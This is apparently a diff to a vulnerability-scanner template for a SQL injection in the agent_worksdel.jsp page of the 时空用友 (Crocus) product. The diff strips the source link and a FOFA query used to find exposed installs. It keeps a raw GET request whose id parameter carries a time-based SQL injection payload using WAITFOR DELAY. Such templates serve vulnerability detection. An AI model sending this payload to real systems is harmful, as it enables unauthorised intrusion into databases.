@@ -3,12 +3,8 @@ info:
   name: 时空用友agent_worksdel存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/acavazn8pnhs8l0f'
+  description: ''
   tags: sqli,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: acavazn8pnhs8l0f
-    fofa: product="Crocus" || (body="/ThirdResource/respond/respond.min.js" && title="Crocus")
 http:
 - raw:
   - 'GET /worksheet/agent_worksdel.jsp?id=1%27;WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
